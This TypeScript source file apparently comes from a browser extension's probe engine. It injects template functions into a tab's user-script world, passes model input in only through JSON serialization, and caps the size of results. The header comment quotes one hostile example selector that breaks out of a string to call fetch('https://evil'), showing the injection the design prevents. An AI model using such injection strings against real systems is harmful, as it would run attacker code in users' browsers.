// Probe engine: serialize an extension-authored template function and run it
// in the active tab's USER_SCRIPT world through the same one-shot injection
// lane evaluate_js uses. The security property lives in buildProbeCode: the
// single JSON.stringify(params) call is the ONLY place model input enters the
// generated source, and JSON output is always a valid JS *expression* — a
// hostile "selector" like `"); fetch('https://evil')//` stays a string value.
//
// fn.toString() round-trips because esbuild does not minify these bundles
// (build.mjs sets no `minify` flag) and the templates in probes.ts are
// self-contained; the page-probes suite's round-trip test makes any future
// build change break loudly rather than silently.

import { scriptInjector, type UserScriptWorld } from "../../platform/script-injector.js";
import { probeHelpers, type ProbeHelpers } from "./probes.js";

export type ProbeTemplate = (params: never, helpers: ProbeHelpers) => object;

/** JSON-compatible parameter records accepted by the shared probe schemas. */
export type ProbePayloadValue = string | number | boolean | null | ProbePayloadValue[] | ProbePayload;
export interface ProbePayload {
  [name: string]: ProbePayloadValue | undefined;
}

/** Cap on the serialized probe result (the wrapper evaluate_js never had). */
export const PROBE_RESPONSE_CHAR_CAP = 128 * 1024;

export function buildProbeCode(probeFn: ProbeTemplate, params: ProbePayload | undefined): string {
  // probeHelpers is extension-authored and takes no arguments — the single
  // JSON.stringify(params) call remains the ONLY place model input enters the
  // generated source.
  return `(async () => {
    try {
      const __value = await (${probeFn.toString()})(${JSON.stringify(params ?? {})}, (${probeHelpers.toString()})());
      return JSON.stringify({ ok: true, value: __value === undefined ? "undefined" : JSON.stringify(__value) });
    } catch (error) {
      return JSON.stringify({ ok: false, message: String(error) });
    }
  })()`;
}

/** Bound what a page can push into the model's context in one probe reply. */
export function capProbeValue(value: string): string {
  if (value.length <= PROBE_RESPONSE_CHAR_CAP) return value;
  return JSON.stringify({ truncated: true, totalChars: value.length, prefix: value.slice(0, PROBE_RESPONSE_CHAR_CAP) });
}

export async function runProbe(
  tabId: number,
  probeFn: ProbeTemplate,
  params: ProbePayload | undefined,
  world: UserScriptWorld = "USER_SCRIPT",
): Promise<string> {
  const backend = scriptInjector();
  if (!backend.available) throw new Error(backend.disabledReason);
  const [injection] = await backend.execute(tabId, buildProbeCode(probeFn, params), world);
  if (injection?.error) throw new Error(injection.error);
  // SAFETY: buildProbeCode serializes this exact reply shape before the injection returns it.
  const outcome = JSON.parse(String(injection?.result)) as { ok: boolean; value?: string; message?: string };
  if (!outcome.ok) throw new Error(outcome.message ?? "probe failed");
  return capProbeValue(outcome.value ?? "undefined");
}
